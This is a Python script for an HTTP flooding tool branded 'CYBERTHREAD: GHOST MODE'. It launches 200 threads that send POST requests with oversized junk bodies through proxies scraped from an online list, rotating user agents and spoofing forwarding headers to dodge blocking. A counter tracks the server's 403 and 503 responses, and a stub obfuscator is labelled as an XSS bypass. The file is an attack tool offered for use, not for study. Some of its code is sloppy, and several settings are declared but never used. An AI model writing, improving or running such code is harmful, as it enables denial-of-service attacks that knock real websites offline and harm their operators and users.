import http.client
import ssl
import json
import random
import threading
import time
from urllib.parse import urlparse
import socket
import sys
import traceback
import os
import base64
import requests

# Auto mode config
target = "http://example.com"
threads = 200
proxy_file = "/tmp/proxy.txt"
ua_file = "/tmp/ua.txt"
hop_count = 2
payload_type = "ghost-mutation"
bypass_header = True
tls_spoofing = True
session_cycle = True
exploit_chain = True
delay = 0.1
flood_method = "POST"
failover_monitoring = True
silent_mode = False
proxies = []
user_agents = []
headers = {}
tls_context = ssl.create_default_context()
status_counter = {"200": 0, "403": 0, "503": 0}
semaphore = threading.Semaphore(100)
stop_event = threading.Event()

# Load proxy from file or fetch online
def fetch_proxies_online():
    try:
        r = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http")
        return r.text.splitlines()
    except:
        return []

def load_list(file):
    if not os.path.exists(file):
        return []
    with open(file) as f:
        return [x.strip() for x in f if x.strip()]

def load_proxies(file):
    global proxies
    proxies = load_list(file)
    if not proxies:
        proxies = fetch_proxies_online()
    if not proxies:
        proxies = ["127.0.0.1:8080"]

def load_user_agents(file):
    global user_agents
    user_agents = load_list(file)
    if not user_agents:
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Linux; Android 10)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
        ]

# Header injection stealth
def inject_headers():
    ip = random.choice(proxies).split(":")[0] if proxies else "127.0.0.1"
    h = {
        "User-Agent": random.choice(user_agents),
        "X-Forwarded-For": ip,
        "X-Real-IP": ip,
        "Connection": "keep-alive",
        "Accept": "*/*"
    }
    if bypass_header:
        h.update({
            "X-Originating-IP": ip,
            "X-Forwarded-Host": target,
            "X-Request-ID": str(random.randint(100000, 999999)),
            "Forwarded": f"for={ip};host={target}"
        })
    return h

# Payload mutator brutal
def mutate_payload(mode):
    if mode == "ghost-mutation":
        return json.dumps({
            "ghost": "true",
            "rand": random.randint(1000, 9999),
            "overflow": "X" * random.randint(5000, 15000)
        })
    return "null"

def handle_response(resp):
    code = str(resp.status)
    status_counter[code] = status_counter.get(code, 0) + 1
    if not silent_mode:
        print(f"[{code}] UA: {headers.get('User-Agent')}")

# Worker engine
def attack():
    global tls_context
    while not stop_event.is_set():
        try:
            semaphore.acquire()
            proxy = random.choice(proxies)
            host, port = proxy.split(":")
            parsed = urlparse(target)
            conn = http.client.HTTPSConnection(host, port=int(port), context=tls_context)
            h = inject_headers()
            p = mutate_payload(payload_type)
            conn.request(flood_method, parsed.path or "/", p, h)
            r = conn.getresponse()
            handle_response(r)
        except Exception:
            pass
        finally:
            semaphore.release()
            time.sleep(delay + random.uniform(0.1, 0.3))

# Status monitor
def print_status():
    while not stop_event.is_set():
        print(f"✅ 200:{status_counter['200']} | 🔒 403:{status_counter['403']} | ⚠️ 503:{status_counter['503']}")
        time.sleep(1)

# String obfuscator (XSS bypass, dummy)
def obfuscate(data):
    data = data.replace("script", "scr\"ipt")
    data = data.replace("admin", "a"+"dmin")
    return data

# Banner
def banner():
    print("""
╔════════════════════════════════════╗
║    ⚔ CYBERTHREAD: GHOST MODE ⚔    ║
║   Brutal Auto-Fire L7 Exploiter    ║
╠════════════════════════════════════╣
║ Target     : {0}
║ Threads    : {1}
║ Payload    : {2}
║ Proxy      : {3}
╚════════════════════════════════════╝
    """.format(target, threads, payload_type, "Auto/Online"))

# MAIN
print("[+] Starting CYBERTHREAD vX Stealth Engine ...")
load_proxies(proxy_file)
load_user_agents(ua_file)
banner()

for _ in range(threads):
    threading.Thread(target=attack).start()

threading.Thread(target=print_status).start()